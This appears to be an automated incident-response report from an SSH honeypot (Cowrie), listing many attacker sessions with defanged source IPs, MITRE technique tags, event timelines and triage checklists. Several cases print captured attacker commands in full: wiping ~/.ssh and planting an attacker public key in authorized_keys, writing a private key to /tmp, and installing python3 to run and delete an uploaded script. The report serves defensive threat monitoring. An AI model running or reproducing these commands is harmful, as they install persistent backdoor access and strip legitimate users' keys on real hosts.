| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:34:02` | `cowrie.session.connect` |
| `2026-10-08 04:34:02` | `cowrie.client.version` |
| `2026-10-08 04:34:03` | `cowrie.client.kex` |
| `2026-10-08 04:34:03` | `cowrie.login.success` |
| `2026-10-08 04:34:04` | `cowrie.session.params` |
| `2026-10-08 04:34:04` | `cowrie.command.input` |
| `2026-10-08 04:34:04` | `cowrie.command.failed` |
| `2026-10-08 04:34:04` | `cowrie.log.closed` |
| `2026-10-08 04:34:05` | `cowrie.session.params` |
| `2026-10-08 04:34:05` | `cowrie.command.input` |
| `2026-10-08 04:34:05` | `cowrie.session.file_download` |
| `2026-10-08 04:34:05` | `cowrie.log.closed` |
| `2026-10-08 04:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.3.155[.]8` to AbuseIPDB if not already reported
- [ ] Block `212.3.155[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dd4a36be3cd

| Field | Detail |
|---|---|
| **Source IP** | `212.3.155[.]8` |
| **First Seen** | 2026-10-08 04:34 |
| **Last Seen** | 2026-10-08 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:34:06` | `cowrie.session.connect` |
| `2026-10-08 04:34:06` | `cowrie.client.version` |
| `2026-10-08 04:34:06` | `cowrie.client.kex` |
| `2026-10-08 04:34:06` | `cowrie.login.success` |
| `2026-10-08 04:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.3.155[.]8` to AbuseIPDB if not already reported
- [ ] Block `212.3.155[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296767336c49

| Field | Detail |
|---|---|
| **Source IP** | `172.211.56[.]214` |
| **First Seen** | 2026-10-08 04:34 |
| **Last Seen** | 2026-10-08 04:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:34:23` | `cowrie.session.connect` |
| `2026-10-08 04:34:23` | `cowrie.client.version` |
| `2026-10-08 04:34:23` | `cowrie.client.kex` |
| `2026-10-08 04:34:24` | `cowrie.login.success` |
| `2026-10-08 04:34:24` | `cowrie.session.params` |
| `2026-10-08 04:34:24` | `cowrie.command.input` |
| `2026-10-08 04:34:24` | `cowrie.command.failed` |
| `2026-10-08 04:34:25` | `cowrie.log.closed` |
| `2026-10-08 04:34:25` | `cowrie.session.params` |
| `2026-10-08 04:34:25` | `cowrie.command.input` |
| `2026-10-08 04:34:25` | `cowrie.session.file_download` |
| `2026-10-08 04:34:25` | `cowrie.log.closed` |
| `2026-10-08 04:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.211.56[.]214` to AbuseIPDB if not already reported
- [ ] Block `172.211.56[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c9b35af89fd

| Field | Detail |
|---|---|
| **Source IP** | `172.211.56[.]214` |
| **First Seen** | 2026-10-08 04:34 |
| **Last Seen** | 2026-10-08 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:34:26` | `cowrie.session.connect` |
| `2026-10-08 04:34:26` | `cowrie.client.version` |
| `2026-10-08 04:34:26` | `cowrie.client.kex` |
| `2026-10-08 04:34:26` | `cowrie.login.success` |
| `2026-10-08 04:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.211.56[.]214` to AbuseIPDB if not already reported
- [ ] Block `172.211.56[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e7bb7429701

| Field | Detail |
|---|---|
| **Source IP** | `221.213.129[.]46` |
| **First Seen** | 2026-10-08 04:37 |
| **Last Seen** | 2026-10-08 04:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:37:37` | `cowrie.session.connect` |
| `2026-10-08 04:37:37` | `cowrie.client.version` |
| `2026-10-08 04:37:38` | `cowrie.client.kex` |
| `2026-10-08 04:37:39` | `cowrie.login.success` |
| `2026-10-08 04:37:40` | `cowrie.session.params` |
| `2026-10-08 04:37:40` | `cowrie.command.input` |
| `2026-10-08 04:37:40` | `cowrie.command.failed` |
| `2026-10-08 04:37:41` | `cowrie.log.closed` |
| `2026-10-08 04:37:41` | `cowrie.session.params` |
| `2026-10-08 04:37:41` | `cowrie.command.input` |
| `2026-10-08 04:37:42` | `cowrie.session.file_download` |
| `2026-10-08 04:37:42` | `cowrie.log.closed` |
| `2026-10-08 04:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.213.129[.]46` to AbuseIPDB if not already reported
- [ ] Block `221.213.129[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb53c66870e6

| Field | Detail |
|---|---|
| **Source IP** | `221.213.129[.]46` |
| **First Seen** | 2026-10-08 04:37 |
| **Last Seen** | 2026-10-08 04:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:37:42` | `cowrie.session.connect` |
| `2026-10-08 04:37:42` | `cowrie.client.version` |
| `2026-10-08 04:37:42` | `cowrie.client.kex` |
| `2026-10-08 04:37:44` | `cowrie.login.success` |
| `2026-10-08 04:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.213.129[.]46` to AbuseIPDB if not already reported
- [ ] Block `221.213.129[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ba3de95ca42

| Field | Detail |
|---|---|
| **Source IP** | `103.146.23[.]23` |
| **First Seen** | 2026-10-08 04:46 |
| **Last Seen** | 2026-10-08 04:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:46:36` | `cowrie.session.connect` |
| `2026-10-08 04:46:36` | `cowrie.client.version` |
| `2026-10-08 04:46:36` | `cowrie.client.kex` |
| `2026-10-08 04:46:37` | `cowrie.login.success` |
| `2026-10-08 04:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.23[.]23` to AbuseIPDB if not already reported
- [ ] Block `103.146.23[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f33e8470c6

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-10-08 04:46 |
| **Last Seen** | 2026-10-08 04:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:46:37` | `cowrie.session.connect` |
| `2026-10-08 04:46:37` | `cowrie.client.version` |
| `2026-10-08 04:46:37` | `cowrie.client.kex` |
| `2026-10-08 04:46:37` | `cowrie.login.success` |
| `2026-10-08 04:46:39` | `cowrie.session.params` |
| `2026-10-08 04:46:39` | `cowrie.command.input` |
| `2026-10-08 04:46:39` | `cowrie.session.file_download` |
| `2026-10-08 04:46:39` | `cowrie.session.file_download` |
| `2026-10-08 04:46:39` | `cowrie.log.closed` |
| `2026-10-08 04:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-822095b7f1bd

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-10-08 04:56 |
| **Last Seen** | 2026-10-08 04:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:56:20` | `cowrie.session.connect` |
| `2026-10-08 04:56:20` | `cowrie.client.version` |
| `2026-10-08 04:56:20` | `cowrie.client.kex` |
| `2026-10-08 04:56:21` | `cowrie.login.success` |
| `2026-10-08 04:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a197cbffdc86

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-10-08 04:56 |
| **Last Seen** | 2026-10-08 04:58 |
| **Session Duration** | 127s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 04:56:24` | `cowrie.session.connect` |
| `2026-10-08 04:56:24` | `cowrie.client.version` |
| `2026-10-08 04:56:24` | `cowrie.client.kex` |
| `2026-10-08 04:56:24` | `cowrie.login.success` |
| `2026-10-08 04:56:25` | `cowrie.session.file_upload` |
| `2026-10-08 04:56:26` | `cowrie.session.params` |
| `2026-10-08 04:56:26` | `cowrie.command.input` |
| `2026-10-08 04:56:26` | `cowrie.command.input` |
| `2026-10-08 04:56:26` | `cowrie.command.input` |
| `2026-10-08 04:56:26` | `cowrie.command.failed` |
| `2026-10-08 04:56:26` | `cowrie.log.closed` |
| `2026-10-08 04:56:27` | `cowrie.session.params` |
| `2026-10-08 04:56:27` | `cowrie.command.input` |
| `2026-10-08 04:56:27` | `cowrie.log.closed` |
| `2026-10-08 04:56:28` | `cowrie.session.params` |
| … | _9 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6229e1c086a

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-10-08 05:10 |
| **Last Seen** | 2026-10-08 05:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-08 05:10:39` | `cowrie.session.connect` |
| `2026-10-08 05:10:39` | `cowrie.client.version` |
| `2026-10-08 05:10:39` | `cowrie.client.kex` |
| `2026-10-08 05:10:39` | `cowrie.login.success` |
| `2026-10-08 05:10:40` | `cowrie.session.params` |
| `2026-10-08 05:10:40` | `cowrie.command.input` |
| `2026-10-08 05:10:40` | `cowrie.command.failed` |
| `2026-10-08 05:10:40` | `cowrie.log.closed` |
| `2026-10-08 05:10:41` | `cowrie.session.params` |
| `2026-10-08 05:10:41` | `cowrie.command.input` |
| `2026-10-08 05:10:41` | `cowrie.session.file_download` |
| `2026-10-08 05:10:41` | `cowrie.log.closed` |
| `2026-10-08 05:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (170) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-3fa20e5b1551 | HIGH | `51.68.226[.]87` | 2026-10-08 05:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9864d0ffdc68 | HIGH | `102.220.163[.]98` | 2026-10-08 05:24 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2071e0facd99 | HIGH | `102.220.163[.]98` | 2026-10-08 05:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2bcf67604cf3 | HIGH | `193.112.192[.]91` | 2026-10-08 05:25 | Y | 1 | 0 | `T1078 · T1592` |
| IR-36161a88f0af | HIGH | `94.154.43[.]69` | 2026-10-08 05:35 | Y | 1 | 6 | `T1059.004 · T1078 · T1105` |
| IR-7a99c574fb39 | HIGH | `2.57.122[.]168` | 2026-10-08 06:02 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-a2db334e8e88 | HIGH | `20.13.164[.]162` | 2026-10-08 06:18 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f9e3b396e0a9 | HIGH | `20.13.164[.]162` | 2026-10-08 06:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-725efdf15a6a | HIGH | `111.238.174[.]6` | 2026-10-08 06:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-abc2bf0dc472 | HIGH | `111.238.174[.]6` | 2026-10-08 06:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3e1f8e44cd15 | HIGH | `172.173.200[.]62` | 2026-10-08 06:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-22ba58b7f0e8 | HIGH | `172.173.200[.]62` | 2026-10-08 06:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0e5a79699633 | HIGH | `196.189.155[.]89` | 2026-10-08 06:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fc8f5c5ab133 | HIGH | `196.189.155[.]89` | 2026-10-08 06:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3c7b52278802 | HIGH | `72.167.227[.]34` | 2026-10-08 06:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a7126546c59f | HIGH | `72.167.227[.]34` | 2026-10-08 06:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-13734ff1393c | HIGH | `176.53.159[.]196` | 2026-10-08 06:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-60f05182d3fd | HIGH | `35.187.41[.]80` | 2026-10-08 06:37 | Y | 2 | 0 | `T1078` |
| IR-3efe5cee4383 | HIGH | `35.187.41[.]80` | 2026-10-08 06:37 | Y | 1 | 0 | `T1078` |
| IR-11a9f3ff15a8 | HIGH | `35.187.41[.]80` | 2026-10-08 06:37 | Y | 0 | 0 | `T1078` |
| IR-4cc8b6d9f4dd | HIGH | `118.38.44[.]223` | 2026-10-08 06:42 | Y | 4 | 0 | `T1078` |
| IR-1edb25bc3f54 | HIGH | `118.38.44[.]223` | 2026-10-08 06:43 | Y | 6 | 0 | `T1078` |
| IR-20a57d59ca20 | HIGH | `34.156.220[.]56` | 2026-10-08 06:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dce8e82fae0c | HIGH | `104.155.105[.]87` | 2026-10-08 07:19 | Y | 2 | 0 | `T1078` |
| IR-137910d215db | HIGH | `104.155.105[.]87` | 2026-10-08 07:19 | Y | 1 | 0 | `T1078` |
| IR-ba27a13f91c5 | HIGH | `104.155.105[.]87` | 2026-10-08 07:19 | Y | 0 | 0 | `T1078` |
| IR-41c3ab451fd0 | HIGH | `190.129.122[.]185` | 2026-10-08 07:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7a5e35033fb3 | HIGH | `190.129.122[.]185` | 2026-10-08 07:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c886690a552b | HIGH | `194.92.50[.]86` | 2026-10-08 07:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5a4895898f30 | HIGH | `194.92.50[.]86` | 2026-10-08 07:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-05516696e23e | HIGH | `165.154.162[.]74` | 2026-10-08 07:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-864ca8d5c147 | HIGH | `165.154.162[.]74` | 2026-10-08 07:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7a87581a941e | HIGH | `211.46.177[.]174` | 2026-10-08 07:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f5ccc5e93e0f | HIGH | `211.46.177[.]174` | 2026-10-08 07:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6b84b4aa38d0 | HIGH | `4.224.40[.]94` | 2026-10-08 07:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8def628f1ba9 | HIGH | `4.224.40[.]94` | 2026-10-08 07:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0b4465b6ea04 | HIGH | `183.201.208[.]25` | 2026-10-08 07:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-37733e24af37 | HIGH | `183.201.208[.]25` | 2026-10-08 07:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d362104f98a9 | HIGH | `117.50.199[.]249` | 2026-10-08 07:40 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-e53cd4f4e54e | HIGH | `35.244.32[.]167` | 2026-10-08 07:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3f21c4f55464 | HIGH | `35.244.32[.]167` | 2026-10-08 07:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8a521a394deb | HIGH | `168.76.131[.]178` | 2026-10-08 07:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-93f177f060f5 | HIGH | `168.76.131[.]178` | 2026-10-08 07:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-602e245142fb | HIGH | `38.76.208[.]159` | 2026-10-08 07:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d20848c128a2 | HIGH | `38.76.208[.]159` | 2026-10-08 07:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-35fad049f5e6 | HIGH | `35.187.111[.]95` | 2026-10-08 07:53 | Y | 2 | 0 | `T1078` |
| IR-7da445ac2706 | HIGH | `35.187.111[.]95` | 2026-10-08 07:53 | Y | 1 | 0 | `T1078` |
| IR-5c9d8d8a18ac | HIGH | `35.187.111[.]95` | 2026-10-08 07:53 | Y | 0 | 0 | `T1078` |
| IR-6f0a24a1c0fc | HIGH | `123.54.215[.]74` | 2026-10-08 08:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-10811e0d81f1 | HIGH | `123.54.215[.]74` | 2026-10-08 08:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a2641b89dbdd | HIGH | `102.220.163[.]98` | 2026-10-08 08:24 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3f5fae9510e0 | HIGH | `102.220.163[.]98` | 2026-10-08 08:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-23e461b5aca1 | HIGH | `47.236.193[.]133` | 2026-10-08 08:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9ec8503ae689 | HIGH | `47.236.193[.]133` | 2026-10-08 08:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-505213f0c941 | HIGH | `8.218.35[.]44` | 2026-10-08 08:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1b662ebe2762 | HIGH | `8.218.35[.]44` | 2026-10-08 08:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d70d81c364f2 | HIGH | `47.237.107[.]46` | 2026-10-08 08:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ad62ccfa4ea1 | HIGH | `47.237.107[.]46` | 2026-10-08 08:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e8c02d9ca3c5 | HIGH | `172.104.11[.]34` | 2026-10-08 08:36 | Y | 3 | 0 | `T1078` |
| IR-de6a29867d1f | HIGH | `177.8.166[.]2` | 2026-10-08 08:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f273c557ac1a | HIGH | `177.8.166[.]2` | 2026-10-08 08:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-32c92868f8e9 | HIGH | `80.94.92[.]234` | 2026-10-08 09:05 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-bedaef448f64 | HIGH | `176.53.159[.]196` | 2026-10-08 09:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c028a00f6845 | HIGH | `103.70.40[.]36` | 2026-10-08 09:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-95b4108ea0a8 | HIGH | `103.70.40[.]36` | 2026-10-08 09:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-862a25aceea9 | HIGH | `195.178.191[.]5` | 2026-10-08 09:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-230c8073725d | HIGH | `195.178.191[.]5` | 2026-10-08 09:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d17c25ece4db | HIGH | `91.134.133[.]184` | 2026-10-08 09:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-088af9cd4f6c | HIGH | `91.134.133[.]184` | 2026-10-08 09:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2eaf716aed27 | HIGH | `43.130.173[.]171` | 2026-10-08 09:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1ce59a36d6e2 | HIGH | `43.130.173[.]171` | 2026-10-08 09:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-22d683aed787 | HIGH | `199.165.159[.]25` | 2026-10-08 09:47 | Y | 3 | 0 | `T1078` |
| IR-615123847fc6 | HIGH | `45.156.129[.]173` | 2026-10-08 09:57 | Y | 3 | 0 | `T1078` |
| IR-36b3e3b0cb49 | HIGH | `80.94.92[.]234` | 2026-10-08 10:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-eedd2225e9d2 | HIGH | `150.136.104[.]48` | 2026-10-08 10:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e848050b055b | HIGH | `150.136.104[.]48` | 2026-10-08 10:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5c028d9e9eb9 | HIGH | `118.38.44[.]223` | 2026-10-08 10:19 | Y | 6 | 0 | `T1078` |
| IR-1eca998cef7d | HIGH | `117.6.44[.]221` | 2026-10-08 10:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1ce2ae9e6769 | HIGH | `117.6.44[.]221` | 2026-10-08 10:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8daf73d26c5b | HIGH | `118.38.44[.]223` | 2026-10-08 10:20 | Y | 4 | 0 | `T1078 · T1110.001` |
